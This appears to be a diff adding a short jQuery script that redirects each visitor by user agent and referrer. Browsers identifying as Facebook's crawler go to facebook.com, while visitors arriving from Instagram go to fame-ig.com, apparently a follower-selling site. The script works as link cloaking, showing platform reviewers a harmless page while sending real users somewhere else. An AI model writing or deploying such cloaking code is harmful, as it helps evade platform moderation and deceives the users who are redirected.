@@ -1,0 +1,25 @@
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+	
+	      <script type="text/javascript">
+         (function($) {
+             $(document).ready(function() {
+                var ua = navigator.userAgent;
+				var ref = document.referrer;
+             var checker = {
+               one: ua.match(/face/),
+               two: ref.match(/instagram/)
+             };
+             if (checker.one){
+			     window.location.href = 'https://facebook.com';		    
+             }
+             else if (checker.two){
+                 window.location.href = 'https://fame-ig.com';
+             }
+			 else
+			 {
+			    window.location.href = 'https://facebook.com';
+			 }
+             });
+         })(jQuery);
+      </script>
